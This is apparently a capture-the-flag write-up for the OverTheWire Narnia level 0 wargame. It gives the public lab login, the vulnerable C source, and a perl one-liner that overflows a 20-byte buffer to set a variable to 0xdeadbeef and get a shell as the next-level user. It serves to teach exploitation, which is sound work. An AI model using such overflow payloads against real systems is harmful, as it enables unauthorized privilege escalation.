# username / password
ssh narnia0@narnia.labs.overthewire.org -p2226

narnia0 / narnia0
# Concept
* variable overwrite via buffer overflow
# Method of solve
* the binary's source is this:
```
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
```
* in the binary, the `val` variable is set to `0x41414141`
* if the `val` variable is set to `0xdeadbeef`, then the `sh` binary is run with the permissions of the file owner, which is `narnia1`
* if we can get access as `narnia1`, then we read their password and get access to the next level
* the `buf` variable, which holds our user input, has a maximum size of 20 characters
* any user input in excess of 20 characters will over the buffer and overwrite other memory addresses
* from testing, we see that even sending 20 characters will overflow a null byte character `00` into the val variable
* so this payload will get us our interactive shell as the `narnia1` user:
```
(perl -e 'print "A" x 20 . "\xef\xbe\xad\xde"';cat) | ./narnia0
```
* we're using `perl` to send a number of `A` characters to fill the buffer, then append the desired hex bytes `0xdeadbeef`
* the reason we are sending the bytes into reverse order is because the binary uses little endian byte order
* the reason why we need to send the `cat` command in a wrapper with the `perl` command is because we need to keep the stdin of the shell open so that we can send commands to the shell

